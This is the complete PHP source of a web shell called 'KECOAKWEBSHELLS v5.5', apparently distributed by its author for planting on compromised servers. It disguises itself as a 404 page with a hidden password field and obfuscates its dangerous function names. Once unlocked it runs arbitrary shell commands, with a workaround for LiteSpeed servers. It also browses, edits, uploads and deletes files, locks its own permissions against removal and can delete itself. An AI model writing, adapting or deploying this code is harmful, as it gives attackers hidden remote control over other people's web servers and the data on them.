<?php
/**
 * KECOAKWEBSHELLS - v5.5
 * umbra.st/L4663r666h05t
 * x.com/L4663r666h05t
 */
session_start();

$p_hash = 'e773536932c61c7ee11944cefde49e30';
$f_name = basename(__FILE__);

function x_d($s) {
    $map = ['!' => 'a', '@' => 'e', '#' => 'i', '$' => 'o', '%' => 'u', '^' => 's', '&' => 'l', '*' => 'n', '(' => 'r', ')' => 't'];
    return strtr($s, $map);
}

$u = [
    's_e' => x_d('^h@&&_@x@c'),
    'f_p' => x_d('f#&@_p%)_c$nt@nt^'),
    'f_g' => x_d('f#&@_g@t_c$nt@nt^'),
    'c_h' => x_d('chm$d'),
    'u_l' => x_d('%n&#nk'),
    's_d' => x_d('^c!nd#(r'),
    'g_c' => x_d('g@tcwd'),
    'r_p' => x_d('r@!&p!)h')
];

if (isset($_GET['exit'])) {
    $_SESSION = array(); session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?')); exit;
}

if (!isset($_SESSION['auth_session'])) {
    if (isset($_POST['token']) && md5($_POST['token']) === $p_hash) {
        $_SESSION['auth_session'] = true; header("Location: " . $_SERVER['PHP_SELF']); exit;
    } else {
        header('HTTP/1.1 404 Not Found');
        echo "<html><body><h1>404 Not Found</h1><form method='POST' style='opacity:0.001;'><input type='password' name='token' autofocus></form></body></html>";
        exit;
    }
}

// --- Permission Toggle Logic ---
if (isset($_GET['set_perm'])) {
    $p = ($_GET['set_perm'] == 'lock') ? 0444 : 0644;
    @$u['c_h']($f_name, $p);
    header("Location: ?d=" . urlencode($_GET['d'])); exit;
}

$cwd = (isset($_GET['d'])) ? $u['r_p']($_GET['d']) : $u['g_c']();
if (!$cwd) $cwd = $u['g_c']();
chdir($cwd);

$status = ""; $cmd_res = "";
$is_ls = (strpos(strtolower($_SERVER['SERVER_SOFTWARE'] ?? ''), 'litespeed') !== false);
$cur_p = substr(sprintf('%o', fileperms($f_name)), -3);

function x_e($c) {
    global $is_ls, $u;
    if ($is_ls) { $c = str_replace(' ', '${IFS}', $c); }
    $f = $u['s_e'];
    return (function_exists($f)) ? @$f($c . " 2>&1") : "Disabled.";
}

if (isset($_POST['cmd'])) { $cmd_res = x_e($_POST['cmd']); }
if (isset($_GET['del'])) { @$u['c_h']($_GET['del'], 0666); @$u['u_l']($_GET['del']); $status = "Done."; }
if (isset($_POST['save'])) {
    @$u['c_h']($_POST['t'], 0666);
    if ($u['f_p']($_POST['t'], $_POST['c']) !== false) $status = "Saved.";
}
if (isset($_POST['kill'])) { @$u['c_h']($f_name, 0666); @$u['u_l']($f_name); exit; }

function get_items($path) {
    global $u;
    if (function_exists($u['s_d'])) {
        $res = @$u['s_d']($path);
        if (is_array($res)) return $res;
    }
    $res = glob($path . DIRECTORY_SEPARATOR . '{,.}[!.,..]*', GLOB_BRACE);
    if ($res !== false && count($res) > 0) return array_map('basename', $res);
    $out = x_e("ls -1a " . escapeshellarg($path));
    if ($out && strpos($out, 'ls:') === false) return explode("\n", trim($out));
    return [];
}

$sys_info = x_e("uname -a");
$s_i = ['u' => get_current_user(), 's' => $_SERVER['SERVER_SOFTWARE'], 'p' => $cwd];
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        * { box-sizing: border-box; font-family: monospace; font-size: 11px; }
        body { background: #fff; padding: 15px; margin: 0; }
        .box { border: 2px solid #000; padding: 10px; margin-bottom: 10px; box-shadow: 4px 4px 0 #000; }
        .term { background: #000; color: #0f0; padding: 10px; border: 2px solid #000; }
        .res { color: #fff; white-space: pre-wrap; max-height: 200px; overflow: auto; border-top: 1px solid #333; margin-top: 5px; }
        .btn { background: #000; color: #fff; border: none; padding: 5px 10px; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 5px; border-bottom: 1px solid #eee; }
        a { color: #000; text-decoration: none; font-weight: bold; }
        .perm-info { font-weight: bold; color: <?php echo ($cur_p == '444') ? 'red' : 'green'; ?>; }
    </style>
</head>
<body>

<div class="box">
    <a href="?exit=1" style="float:right; background:red; color:#fff; padding:2px 10px;">EXIT</a>
    <strong>KERNEL:</strong> <?php echo $sys_info; ?><br>
    <strong>USER:</strong> <?php echo $s_i['u']; ?> | <strong>SVR:</strong> <?php echo $s_i['s']; ?><br>
    <strong>SCRIPT PERM:</strong> <span class="perm-info"><?php echo $cur_p; ?></span>
    [ <a href="?d=<?php echo urlencode($cwd); ?>&set_perm=<?php echo ($cur_p == '444' ? 'unlock' : 'lock'); ?>"><?php echo ($cur_p == '444' ? 'UNLOCK' : 'LOCK (Anti-Delete)'); ?></a> ]
</div>

<div class="term">
    <form method="POST">$ <input type="text" name="cmd" style="background:transparent;border:none;color:#0f0;width:90%;outline:none;" autofocus autocomplete="off"></form>
    <?php if ($cmd_res): ?><div class="res"><?php echo htmlspecialchars($cmd_res); ?></div><?php endif; ?>
</div>

<div class="box" style="margin-top:10px;">
    <strong>PATH:</strong> <?php echo $s_i['p']; ?> | <a href="?d=/etc">[etc]</a> <a href="?d=/tmp">[tmp]</a> <a href="?d=/var/www/html">[www]</a>
    <table style="margin-top:10px;">
        <tr><td>📁 <a href="?d=<?php echo urlencode(dirname($cwd)); ?>">.. (Parent)</a></td><td></td></tr>
        <?php
        $items = get_items($cwd);
        if (!empty($items)) {
            sort($items);
            foreach($items as $i) {
                $i = trim($i); if($i === "." || $i === ".." || empty($i)) continue;
                $p = $cwd . DIRECTORY_SEPARATOR . $i; $is_d = is_dir($p);
                echo "<tr>
                    <td>".($is_d ? "📁" : "📄")." <a href='".($is_d ? "?d=".urlencode($p) : "#")."'>$i</a></td>
                    <td align='right'>";
                if(!$is_d) {
                    echo "<a href='?d=".urlencode($cwd)."&edit=".urlencode($p)."'>[E]</a> ";
                    echo "<a href='?d=".urlencode($cwd)."&del=".urlencode($p)."' onclick=\"return confirm('Del?')\">[X]</a>";
                }
                echo "</td></tr>";
            }
        }
        ?>
    </table>
</div>

<div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px;">
    <div class="box"><strong>UPLOAD</strong><form method="POST" enctype="multipart/form-data"><input type="file" name="u"><button type="submit" class="btn">UP</button></form></div>
    <div class="box"><strong>WIPE</strong><form method="POST"><button type="submit" name="kill" class="btn" style="background:red; width:100%;">SELF DESTRUCT</button></form></div>
</div>

<?php if(isset($_GET['edit']) && is_file($_GET['edit'])): ?>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;padding:20px;z-index:99;border:5px solid #000;">
    <strong>EDIT: <?php echo basename($_GET['edit']); ?></strong> <a href="?d=<?php echo urlencode($cwd); ?>" style="float:right;">[X] CLOSE</a>
    <form method="POST" style="height:90%;">
        <input type="hidden" name="t" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
        <textarea name="c" style="width:100%;height:85%;margin-top:10px;border:2px solid #000;"><?php echo htmlspecialchars($u['f_g']($_GET['edit'])); ?></textarea><br>
        <button type="submit" name="save" class="btn">SAVE</button>
    </form>
</div>
<?php endif; ?>

</body>
</html>
